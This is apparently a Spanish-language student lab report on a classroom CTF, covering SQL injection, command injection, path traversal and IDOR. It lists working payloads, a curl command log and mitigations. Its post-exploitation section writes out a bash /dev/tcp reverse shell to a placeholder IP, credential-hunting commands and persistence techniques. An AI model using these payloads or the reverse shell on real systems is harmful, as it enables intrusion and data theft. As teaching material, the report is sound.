# Informe — Laboratorio 07 · Explotación

**Grupo:** 12  
**Integrantes:**
- Gerbaudo, Mateo — @gerbaudo19
- Mariatti, Matias — @matiasmariatticasc
- Colque Condo, Luis Alvaro — @ColqueAlvaro
- Rodriguez, Gonzalo — @Gonza149  
**Fecha:** 30 de Octubre de 2026

---

## 0. Declaración de uso de IA

En cumplimiento con el régimen de la cátedra y las pautas de `CONTRIBUTING.md`:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini 3.8 Flash).
- **Alcance de la asistencia:** Asistencia en la inicialización de la entrega, estructuración del informe técnico, configuración del entorno de documentación para el grupo y registro de captura de banderas del CTF (@gerbaudo19); asistencia en la documentación analítica de los vectores explotados, consultas y comandos resultantes, evaluación de impacto, defensas técnicas en la Sección 2 (Tabla de explotación R1-R5) y estructuración de la Sección 4 (Bitácora de comandos) (@matiasmariatticasc); asistencia en la redacción técnica de las preguntas P1–P3 (@ColqueAlvaro); asistencia en la fundamentación arquitectónica de P4 (consultas parametrizadas) y P5 (control de acceso del lado servidor frente a IDOR), así como en la redacción del mini-research sobre sentencias preparadas en `research.md` (@Gonza149).
- **Partes originadas o modificadas:** Inicialización de `INTEGRANTES.md`, Sección 0 (Declaración de uso de IA) y Sección 1 (Flags capturadas de R1 a R5) por @gerbaudo19; Sección 2 (Tabla de explotación) y Sección 4 (Bitácora de comandos) por @matiasmariatticasc; Sección 3: preguntas de análisis P1, P2 y P3 por @ColqueAlvaro; Sección 3: preguntas de análisis P4 y P5 y archivo `research.md` por @Gonza149.
- **Verificación humana:** Se verificaron las credenciales y roles de los integrantes del Grupo 12, se contrastaron los identificadores y hashes de los retos R1 a R5 contra `retos.manifest`. Para la Sección 2 y 4, se contrastó cada payload contra el código fuente del backend (`server.py`), validando que la sintaxis de las consultas resultantes en SQLite, comandos en bash y resoluciones de ruta canónica reflejen con precisión la ejecución del servidor vulnerable, así como las recomendaciones de mitigación según OWASP (ASVS y Top 10:2021).

---

## 1. Flags capturadas

Salida de `./ctf status 07`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)

  ✓ ¡Lab 07 COMPLETO! Ponete las pilas con la próxima unidad.
```

---

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| **SQLi auth (R1)** | `admin' --` *(en campo user)* | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='...'` | **Bypass de autenticación (Crítico):** Acceso con rol de administrador sin conocer ni validar contraseña, desbloqueando el panel de administración y obteniendo la bandera de autenticación (`FLAG{sqli_auth_bypass}`). | **Consultas preparadas (Prepared Statements):** Parametrizar la consulta con placeholders (`WHERE user=? AND pass=?`) y almacenar las contraseñas utilizando funciones lentas de hash con salting (PBKDF2/Argon2/bcrypt) en lugar de comparaciones en texto claro. |
| **SQLi UNION (R2)** | `' UNION SELECT clave, valor FROM secrets --` *(en parámetro q)* | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%' UNION SELECT clave, valor FROM secrets --%'` | **Exfiltración de datos no autorizada (Alto):** Anexión de resultados de tablas internas arbitrarias (`secrets`) en la respuesta pública del catálogo, extrayendo claves secretas y la bandera (`FLAG{sqli_union_dump}`). | **Parametrización estricta de consultas LIKE:** Utilizar `WHERE nombre LIKE ?` pasando el término con comodines (`%termino%`) como parámetro enlazado; aplicar principio de mínimo privilegio en la base de datos limitando tablas accesibles para el usuario de la app. |
| **Command injection (R3)** | `127.0.0.1; cat /app/flags/cmdi.txt` *(en parámetro host)* | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` *(vía os.popen)* | **Ejecución Remota de Código - RCE (Crítico):** Control arbitrario de la consola del sistema operativo bajo el usuario del proceso web (`app`), permitiendo lectura de archivos confidenciales del servidor (`FLAG{command_injection_rce}`) y pivoteo hacia la red interna. | **Evitar ejecución mediante shell del SO:** Usar librerías nativas de red (ej. sockets de Python) para verificar conectividad en lugar de llamar a `ping` con `os.popen()`. Si es mandatorio invocar binarios, utilizar `subprocess.run(["ping", "-c1", host], shell=False)` con validación previa de whitelist estricta (`^[a-zA-Z0-9.-]+$`). |
| **Path traversal (R4)** | `../flags/lfi.txt` *(en parámetro archivo)* | `open("/app/public/../flags/lfi.txt")` $\rightarrow$ resuelve canónicamente a `/app/flags/lfi.txt` | **Lectura arbitraria de archivos locales - LFI (Alto):** Evasión del directorio raíz público (`/app/public/`), logrando acceder y leer archivos sensibles del sistema operativo y flags restringidas (`FLAG{path_traversal_lfi}`). | **Validación y canonicidad de rutas:** Resolver la ruta absoluta con `os.path.realpath()` y validar que comience estrictamente con el prefijo permitido (`os.path.commonpath([base_dir, target]) == base_dir`); o aislar la descarga a nombres seguros con `os.path.basename()` y rechazar secuencias `../`. |
| **IDOR (R5)** | `id=1` *(en parámetro de consulta)* | `SELECT id, user, rol, nota_privada FROM users WHERE id=1` | **Acceso indebido a objetos y datos ajenos (Medio/Alto):** Ruptura del control de acceso a nivel de objeto; cualquier usuario puede consultar identificadores numéricos ajenos y acceder a la nota privada del administrador que contiene `FLAG{idor_broken_access}`. | **Control de acceso en el servidor:** No confiar en identificadores provistos por el cliente en endpoints personales; asociar la consulta al identificador del usuario autenticado en la sesión (`WHERE id = current_user.id`) o implementar políticas de autorización en backend verificando pertenencia antes de servir el recurso. |

---

## 3. Preguntas de análisis

### P1 — Por qué funciona el bypass de autenticación (análisis de la query SQL)

En el backend (`server.py`), la consulta encargada de validar las credenciales de acceso en el formulario de login se construye mediante interpolación directa de cadenas sin parametrización:
```python
query = f"SELECT user, rol FROM users WHERE user='{user}' AND pass='{password}'"
```
Cuando el atacante ingresa en el campo `user` el payload `admin' --`, suceden dos fenómenos sintácticos que rompen la frontera entre datos y código:
1. **Ruptura del delimitador de cadena:** La comilla simple (`'`) introducida en el payload cierra prematuramente la constante literal que contenía el nombre de usuario (`user='admin'`).
2. **Neutralización del resto de la consulta mediante comentario:** La secuencia de dos guiones seguidos de un espacio (`-- `) representa en el estándar SQL (y específicamente en SQLite) el inicio de un comentario de línea. Todo lo que sigue a dicha secuencia es completamente ignorado por el analizador sintáctico del motor de base de datos.

La consulta finalmente armada y ejecutada en el motor relacional resulta:
```sql
SELECT user, rol FROM users WHERE user='admin' --' AND pass='cualquiera'
```
Como consecuencia directa, el motor evalúa únicamente `WHERE user='admin'`. La verificación de la contraseña (`AND pass='...'`) es descartada. Dado que el usuario `admin` existe en la base de datos de PhantomCorp, la condición lógica devuelve `TRUE` y la consulta retorna con éxito el registro con el rol de administrador (`rol: administrator`). El servidor constata que la consulta arrojó un resultado válido y autentica la sesión como administrador, logrando el bypass completo sin necesidad de conocer ni adivinar la contraseña.

### P2 — Por qué el operador UNION requiere igual número de columnas y cómo determinarlo

El operador `UNION` permite concatenar los conjuntos de resultados de dos o más sentencias `SELECT` independientes en una única estructura tabular. De acuerdo con el estándar ANSI/ISO SQL, para que la operación sea válida el motor impone dos restricciones formales inviolables:
1. **Igualdad en la cantidad de columnas (aridad idéntica):** Si la consulta principal proyecta $N$ columnas (`SELECT col1, col2, ..., colN FROM tabla_A`), la consulta anexada debe proyectar con absoluta precisión exactamente $N$ columnas (`UNION SELECT val1, val2, ..., valN FROM tabla_B`). Si las cantidades difieren, el motor aborta la operación con un error estructural (en SQLite: *"SELECTs to the left and right of UNION do not have the same number of result columns"*), pues resulta físicamente imposible estructurar una matriz relacional coherente cuando las filas tienen anchos de columnas heterogéneos.
2. **Compatibilidad de tipos de datos:** Los tipos de datos de las columnas situadas en las mismas posiciones ordinales deben ser compatibles o coercibles entre sí para poder compartir la misma definición de tipo en la salida final.

**Cómo averiguar el número de columnas a ciegas (sin acceso al código fuente):**
En un escenario de auditoría de caja negra, un analista determina el número exacto de columnas mediante dos técnicas empíricas deterministas:
- **Técnica 1 — Cláusula `ORDER BY` incremental:**
  Se inyecta sucesivamente `' ORDER BY 1 --`, `' ORDER BY 2 --`, `' ORDER BY 3 --`, incrementando el índice de 1 en 1. La instrucción `ORDER BY N` ordena el resultado por la columna posicional $N$. Cuando $N$ excede la cantidad real de columnas de la consulta, la base de datos genera un error (ej. *"ORDER BY column number 3 out of range"*). Si `ORDER BY 2` devuelve código HTTP 200 y `ORDER BY 3` dispara un error (HTTP 500 o mensaje de error SQL en pantalla), se concluye con certeza matemática que la consulta proyecta exactamente 2 columnas.
- **Técnica 2 — Inyección de `UNION SELECT NULL` creciente:**
  El valor `NULL` es universalmente compatible con cualquier tipo de dato en casi todos los RDBMS. Se inyecta sucesivamente:
  - `' UNION SELECT NULL --` $\rightarrow$ Falla (disparidad de columnas).
  - `' UNION SELECT NULL, NULL --` $\rightarrow$ Si no genera error y devuelve la página con normalidad, se confirma que la consulta maneja 2 columnas. A continuación, se reemplaza cada `NULL` por un valor de prueba (ej. `'a'`, `'b'`) para identificar en qué posición de la interfaz se refleja visiblemente cada dato exfiltrado.

### P3 — Qué sigue después de obtener RCE (persistencia y post-explotación hacia el Lab 08)

La ejecución remota de comandos (RCE) obtenida en el reto R3 mediante la inyección de comandos en el endpoint de ping (`host=127.0.0.1; cat ...`) constituye un punto de apoyo inicial (*foothold*), pero su uso a través de peticiones HTTP es incómodo, no interactivo y susceptible a timeouts. En una intrusión real (y como puente metodológico directo hacia el Lab 08), las acciones inmediatas que ejecuta un atacante son:

1. **Establecimiento de una terminal interactiva (Reverse Shell):**
   El atacante pone a la escucha un listener en su infraestructura (`ncat -lvnp 4444`) e inyecta un payload que obligue al servidor a conectarse de vuelta enviando una shell interactiva (`bash -i >& /dev/tcp/<ip>/4444 0>&1` o mediante un script en Python/Netcat). Esto permite operar en tiempo real con una pseudo-terminal completa.
2. **Reconocimiento local del host (*Local Enumeration*):**
   Inspeccionar exhaustivamente el entorno interno: arquitectura y kernel (`uname -a`), cuentas locales (`cat /etc/passwd`), conexiones de red e interfaces internas (`ss -tuln`, `ip a`), procesos activos (`ps aux`), variables de entorno (`env`) y el historial de comandos (`cat ~/.bash_history`), buscando credenciales olvidadas en archivos de configuración (`.env`, `config.php`, backups).
3. **Escalada de privilegios (*Privilege Escalation* — Lab 08):**
   El proceso web corre bajo una cuenta de servicio de bajos privilegios (`app` o `www-data`). Para obtener control total del equipo, el atacante busca vectores de escalada a `root`: binarios con el bit SUID activo (`find / -perm -4000 2>/dev/null`), comandos permitidos sin clave en `sudo -l`, tareas cron desprotegidas o vulnerabilidades locales del kernel (LPE).
4. **Implantación de mecanismos de persistencia:**
   Garantizar que el acceso no se pierda si el proceso web se reinicia o se corrige la vulnerabilidad de inyección. Esto se realiza agregando una llave SSH pública en `~/.ssh/authorized_keys`, programando un cronjob recurrente que reviva la shell reversa, o creando un usuario oculto en el sistema.
5. **Movimiento lateral y Pivoting (Lab 08):**
   Utilizar la máquina comprometida como cabeza de puente (*pivot*) para explorar segmentos de red internos inaccesibles desde el exterior (por ejemplo, el host interno de base de datos `phantomcorp-db`), expandiendo el compromiso a través de la infraestructura corporativa.

### P4 — Por qué las consultas parametrizadas (Prepared Statements) matan la SQLi de raíz

La inyección SQL ocurre exclusivamente cuando el motor de base de datos recibe una única cadena de texto donde las **instrucciones del lenguaje (código SQL)** y la **entrada del usuario (datos)** ya fueron concatenadas previamente por la aplicación, obligando al analizador sintáctico (*parser*) del motor a adivinar dónde termina un dato y dónde empieza un operador lógico.

Las **consultas parametrizadas** (*Prepared Statements*) eliminan esta vulnerabilidad de raíz porque **separan estructural y temporalmente el canal de código del canal de datos** en dos fases estrictamente independientes dentro del motor relacional (en el caso del portal de PhantomCorp, SQLite a través del módulo `sqlite3` de Python):

1. **Fase 1 — Preparación y compilación del árbol sintáctico (`sqlite3_prepare_v2`):**
   La aplicación envía primero la plantilla estática de la consulta utilizando marcadores de posición (*placeholders* `?`), sin incluir ningún dato del usuario:
   ```python
   # Remedio para R1 (POST /login) en server.py
   sql = "SELECT user, rol FROM users WHERE user = ? AND pass = ?"
   fila = DB.execute(sql, (user, pw)).fetchone()
   ```
   En este instante, el motor SQLite realiza el análisis léxico, construye el **Árbol de Sintaxis Abstracta (AST)** y compila el plan de ejecución en bytecode de su máquina virtual interna (VDBE). La estructura lógica de la consulta queda **congelada e inmutable**: tiene exactamente dos predicados unidos por un `AND`, y ningún paso posterior vuelve a invocar al parser SQL.

2. **Fase 2 — Enlace de parámetros (`sqlite3_bind_text`) y ejecución (`sqlite3_step`):**
   Recién cuando el plan de ejecución ya está compilado, los valores ingresados por el usuario (`user` y `pw`) se envían por separado y se enlazan directamente a los registros de memoria asignados a cada placeholder `?` como escalares literales puros (tipo `TEXT`).
   - Si el atacante envía `user = "admin' --"`, el motor **no** interpreta la comilla simple `'` como cierre de cadena ni `--` como comentario; simplemente busca en la columna `user` un registro cuyo nombre sea literalmente la cadena de 9 caracteres `admin' --`, y además exige que la columna `pass` coincida con el segundo parámetro.
   - Del mismo modo, en el buscador del reto R2 (`GET /buscar`), al parametrizar como `DB.execute("SELECT nombre, precio FROM productos WHERE nombre LIKE ?", (f"%{termino}%",))`, el payload `' UNION SELECT clave, valor FROM secrets --` jamás puede anexar un `UNION` al árbol sintáctico porque el AST ya fue cerrado en la Fase 1.

Por eso parametrizar erradica la SQLi de raíz: a diferencia del filtrado o escapado manual de caracteres (`replace("'", "\\'")`), que intenta adivinar qué símbolos son peligrosos, las consultas parametrizadas hacen que sea **arquitectónicamente imposible** que un dato modifique la gramática de la consulta.

### P5 — Por qué el control de acceso (IDOR) no puede depender del cliente y dónde debe implementarse

En el reto R5 (`GET /perfil?id=3`), la aplicación curiosamente sí utiliza una consulta parametrizada (`SELECT id,user,rol,nota_privada FROM users WHERE id=?`), por lo que no es vulnerable a SQLi; sin embargo, sufre una falla crítica de **Control de Acceso Roto (*Broken Object Level Authorization* — BOLA / IDOR, OWASP A01:2021)** que permite leer la nota privada del administrador simplemente cambiando el parámetro a `?id=1`.

**¿Por qué el control de acceso jamás puede depender del lado del cliente?**
Todo lo que reside o se origina en el cliente (navegador web, aplicación móvil, interfaz HTML/JS, parámetros de URL, campos `<input type="hidden">`, cabeceras HTTP o cookies no firmadas) se ejecuta fuera del perímetro de confianza del servidor y está bajo el **control absoluto del usuario/atacante**:
- Aunque la interfaz gráfica del portal solo muestre un botón hacia *"Mi perfil (`?id=3`)"* y oculte los enlaces a otros perfiles, un atacante no está obligado a usar los botones de la interfaz: puede interceptar la petición con un proxy (Burp Suite / OWASP ZAP), modificar la barra de direcciones del navegador o invocar directamente `curl -s "http://phantomcorp/perfil?id=1"`.
- Confiar en que el cliente "no va a cambiar el `id`" equivale a **seguridad por oscuridad**, no a un control de acceso real.

**¿Dónde y cómo debe implementarse la verificación?**
El control de acceso debe ejecutarse **de forma obligatoria en el servidor (Backend)**, en cada petición (*per-request authorization check*), aplicando el principio de **denegar por defecto (*Deny by Default*)**:

1. **Derivación directa desde el contexto de sesión del servidor (Patrón recomendado para perfil propio):**
   Si el endpoint devuelve el perfil del propio usuario logueado (`/perfil`), la aplicación ni siquiera debe recibir un parámetro `id` desde el cliente. El servidor debe identificar al usuario a partir de su token o sesión autenticada del lado del servidor y consultar únicamente ese registro:
   ```python
   # El ID se obtiene de la sesión validada en el servidor, NO del query string
   current_user_id = session.get("user_id")
   if not current_user_id:
       self._send(401, "No autenticado"); return
   fila = DB.execute("SELECT id, user, rol, nota_privada FROM users WHERE id = ?", (current_user_id,)).fetchone()
   ```
2. **Verificación explícita de pertenencia y rol (Autorización a nivel de objeto — BOLA):**
   Si por diseño de negocio el endpoint requiere recibir el identificador del recurso (`/perfil?id=<pid>`), el backend debe verificar antes de devolver los datos que el sujeto autenticado sea el **propietario** de ese objeto o posea el **rol administrativo** explícito para auditarlo:
   ```python
   requested_id = int(q.get("id", [0])[0])
   if session.user_id != requested_id and session.rol != "admin":
       self._send(403, "Acceso denegado: no tiene permisos sobre este recurso")
       return
   ```
3. **Defensa en profundidad (Identificadores indirectos / UUIDv4):**
   Reemplazar los IDs numéricos autoincrementales predecibles (`1, 2, 3...`) por identificadores únicos universalmente aleatorios (`UUIDv4`) mitiga la enumeración masiva por fuerza bruta, pero siempre como **complemento** y nunca como sustituto de la validación de autorización en el servidor.

---

## 4. Bitácora de comandos

Comandos ejecutados desde la consola del atacante (`make shell`) contra el entorno vulnerable `http://phantomcorp`:

```bash
# ==========================================
# R1: SQLi - Bypass de Autenticación
# ==========================================
# Inyección en el parámetro 'user' comentando la validación del password con '--'
curl -s -X POST http://phantomcorp/login \
  --data-urlencode "user=admin' --" \
  --data-urlencode "pass=cualquiera"

# Enviar flag al evaluador CTF
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'

# ==========================================
# R2: SQLi - Extracción con UNION
# ==========================================
# Determinación de columnas y extracción de la tabla 'secrets'
curl -s -G http://phantomcorp/buscar \
  --data-urlencode "q=' UNION SELECT clave, valor FROM secrets --"

# Enviar flag al evaluador CTF
./ctf submit 07 R2 'FLAG{sqli_union_dump}'

# ==========================================
# R3: Command Injection (RCE)
# ==========================================
# Encadenamiento de comandos en el parámetro host mediante ';'
curl -s -G http://phantomcorp/herramientas/ping \
  --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"

# Enviar flag al evaluador CTF
./ctf submit 07 R3 'FLAG{command_injection_rce}'

# ==========================================
# R4: Path Traversal (LFI)
# ==========================================
# Escape del directorio '/app/public' mediante '../'
curl -s -G http://phantomcorp/descargar \
  --data-urlencode "archivo=../flags/lfi.txt"

# Enviar flag al evaluador CTF
./ctf submit 07 R4 'FLAG{path_traversal_lfi}'

# ==========================================
# R5: IDOR - Control de Acceso Roto
# ==========================================
# Consulta del objeto con ID correspondiente al admin (id=1)
curl -s -G http://phantomcorp/perfil \
  --data-urlencode "id=1" | jq .

# Enviar flag al evaluador CTF
./ctf submit 07 R5 'FLAG{idor_broken_access}'

# ==========================================
# Verificación de estado del laboratorio
# ==========================================
./ctf status 07
```
